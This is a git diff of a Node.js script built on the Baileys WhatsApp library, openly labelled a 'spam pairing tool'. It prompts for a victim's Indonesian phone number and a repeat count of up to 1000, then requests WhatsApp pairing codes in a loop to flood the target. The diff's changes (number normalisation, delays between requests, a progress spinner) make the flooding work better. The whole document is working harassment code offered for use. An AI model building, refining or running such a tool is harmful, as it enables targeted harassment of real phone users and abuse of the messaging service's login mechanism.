@@ -2,24 +2,38 @@ const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysocket
 const pino = require('pino');
 const readline = require("readline");
 
-const color = [
-    '\x1b[31m', 
-    '\x1b[32m', 
-    '\x1b[33m', 
-    '\x1b[34m', 
-    '\x1b[35m', 
-    '\x1b[36m'
-];
+const color = ['\x1b[31m', '\x1b[32m', '\x1b[33m', '\x1b[34m', '\x1b[35m', '\x1b[36m'];
 const wColor = color[Math.floor(Math.random() * color.length)];
 const xColor = '\x1b[0m';
 
 const question = (text) => {
     const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
-    return new Promise((resolve) => { rl.question(text, resolve) });
+    return new Promise((resolve) => rl.question(text, (ans) => { rl.close(); resolve(ans); }));
 };
 
+function normalizePhoneNumber(input) {
+    let num = input.replace(/[^\d]/g, '');
+    if (num.startsWith('0')) num = '62' + num.slice(1);
+    if (num.startsWith('+62')) num = '62' + num.slice(3);
+    return num;
+}
+
+const delay = (ms) => new Promise(res => setTimeout(res, ms));
+
+async function loadingSpinner(text, duration = 2000, interval = 200) {
+    const frames = ['/', '|', '\\', '–'];
+    let i = 0;
+    const start = Date.now();
+    while (Date.now() - start < duration) {
+        process.stdout.write(`\r${text} ${frames[i % frames.length]} `);
+        await delay(interval);
+        i++;
+    }
+    process.stdout.write('\r' + ' '.repeat(50) + '\r');
+}
+
 async function LuciferXSatanic() {
-    const { state } = await useMultiFileAuthState('./69/session');
+    const { state } = await useMultiFileAuthState('./LUCIFER/session');
     const LuciferBot = makeWASocket({
         logger: pino({ level: "silent" }),
         printQRInTerminal: false,
@@ -34,11 +48,16 @@ async function LuciferXSatanic() {
         markOnlineOnConnect: true,
         browser: ["Ubuntu", "Chrome", "20.0.04"],
     });
+
     try {
-        // Minta nomor target
-        const phoneNumber = await question(wColor + 'ターゲット番号を入力してください : ' + xColor);
-        
-        // Minta jumlah spam
+        let rawNumber = await question(wColor + 'ターゲット番号を入力してください : ' + xColor);
+        let phoneNumber = normalizePhoneNumber(rawNumber);
+
+        if (!phoneNumber.startsWith('62')) {
+            console.log('❌ インドネシア国番号 (62) を必ず使用してください');
+            return;
+        }
+
         const LuciferCodes = parseInt(await question(wColor + 'スパム回数を入力してください : ' + xColor));
 
         if (isNaN(LuciferCodes) || LuciferCodes <= 0) {
@@ -46,15 +65,16 @@ async function LuciferXSatanic() {
             return;
         }
 
-        // Loop kirim pairing code
         for (let i = 0; i < LuciferCodes; i++) {
             try {
+                await loadingSpinner(`Sending package to ${phoneNumber}`, 2000, 200);
                 let code = await LuciferBot.requestPairingCode(phoneNumber);
                 code = code?.match(/.{1,4}/g)?.join("-") || code;
                 console.log(wColor + `スパム成功 ✅ 番号 : ${phoneNumber} [${i + 1}/${LuciferCodes}]` + xColor);
             } catch (error) {
                 console.error('エラー:', error.message);
             }
+            await delay(5000);
         }
     } catch (error) {
         console.error('エラーが発生しました');
@@ -63,19 +83,18 @@ async function LuciferXSatanic() {
     return LuciferBot;
 }
 
-console.log(wColor + `=========================
+console.log(wColor + `
  • スパムペアリングツール
  • 作成者: Hazel
  • 使用注意
-=========================
 ┏❐
 ┃ [ 以下の指示に従ってください ]
 ┃
-┃⭔ ターゲット番号 (例: 62xxxxxxx)
+┃⭔ ターゲット番号 (例: 62xxxxxxx / +62 xxxx / 08xxxx)
 ┃⭔ スパム回数 (1-1000)
 ┃
-┃ [ このツールは +62 の番号でのみ使用可能です ]
+┃ [ このツールは +62 または 08 で始まる番号で使用可能です ]
 ┗❐
-=========================` + xColor);
+` + xColor);
 
 LuciferXSatanic();
